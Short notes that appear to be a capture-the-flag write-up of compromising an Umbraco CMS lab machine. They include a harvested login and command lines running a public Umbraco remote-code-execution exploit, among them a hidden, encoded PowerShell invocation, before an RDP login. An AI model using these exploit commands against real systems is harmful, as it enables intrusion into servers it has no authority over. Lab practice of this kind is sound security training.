Can log into http://10.10.61.62/umbraco 
`SG@anthem.com:UmbracoIsTheBest!`

Found a public exploit for Umbraco CMS ([ExploitDB](https://www.exploit-db.com/exploits/49488))

Ran the exploit
```bash
python 49488.py -u 'SG@anthem.com' -p 'UmbracoIsTheBest!' -i http://10.10.61.62 -c whoami
```
![[Pasted image 20240821125548.png]]
Gained a better interactive shell using an exploit available on [GitHub](https://github.com/Jonoans/Umbraco-RCE)

Having a real hard time sending a file over to the victim machine to gain a reverse shell
![[Pasted image 20240821135824.png]]
Therefore, executing commands like
```bash
python exploit.py -u 'SG@anthem.com' -p 'UmbracoIsTheBest!' -i http://10.10.61.62 -c 'powershell' -a '-nop -w hidden -e bABzACAAQwA6AFwA'
```

Tried a lot to get a reverse shell but none worked

Attempted to RDP as SG with the gathered credentials, and was able to log in as SG
